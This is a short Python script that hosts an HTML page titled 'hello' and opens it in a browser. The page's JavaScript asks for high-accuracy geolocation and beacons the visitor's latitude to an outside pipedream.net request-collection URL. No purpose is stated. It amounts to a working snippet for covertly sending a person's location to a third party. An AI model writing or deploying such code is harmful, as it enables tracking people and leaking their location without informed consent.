from src.HTTPEncodings import encodeURIComponent
from src.HTTPEncodings import decodeURIComponent
from src.Utils import https_host
import webbrowser

url = https_host("""
<html>
    <head>
        <title> hello </title>
    </head>
    <body>
        <script>
            navigator.geolocation.getCurrentPosition((d)=>navigator.sendBeacon('https://enbit6i3l2ra4.x.pipedream.net/', d.coords.latitude.toString()),(err)=>console.error(err), {'enableHighAccuracy':true});
        </script>
    </body>
</head>
""")

webbrowser.open(url)


